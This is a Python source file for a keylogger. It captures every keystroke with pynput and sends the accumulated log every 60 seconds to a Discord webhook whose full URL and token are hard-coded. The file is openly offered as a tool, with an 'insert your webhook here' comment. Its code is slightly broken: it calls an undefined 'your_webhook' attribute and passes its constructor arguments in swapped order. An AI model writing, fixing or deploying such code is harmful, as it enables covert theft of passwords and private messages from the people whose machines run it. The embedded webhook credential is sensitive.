from discordwebhook import Discord
from threading import Timer 
from datetime import datetime
from dhooks import Webhook
from pynput.keyboard import Listener


WEBHOOK_URL="https://discord.com/api/webhooks/1106361616997552198/eljNYF0qCC0Mjp7JPUidUmSP2cCBJiioIK0jtBQRYkpr_rG4r2T4tsmyhYAKMGoerxyM" #insert your webhook here

target=Discord(url=WEBHOOK_URL)
target.post(content="Initialized. Works great!") # test to see if webhook works. If you do not see this message in your server, then you have added the wrong url.

LOG_SECS = 60 # sends log every 60 seconds

class Keylogger:
    def __init__(self, interval, webhook_url):
        self.interval = interval
        self.webhook = Webhook(WEBHOOK_URL)
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def _add_date(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":","")

    def _send_report(self):
        if self.log != "":
            self.your_webhook.post(datetime.now())
            self.your_webhook.post()
            self.your_webhook.send(self.log)
            self.log = ""
        Timer(self.interval,self._send_report).start()
        
    def _when_key_pressed_(self, key):
        self.log += str(key)

    def start(self):
        self._send_report()
        with Listener(self._when_key_pressed_) as i:
            i.join()

if __name__ == '__main__':
    Keylogger(WEBHOOK_URL,LOG_SECS).start()
        


                
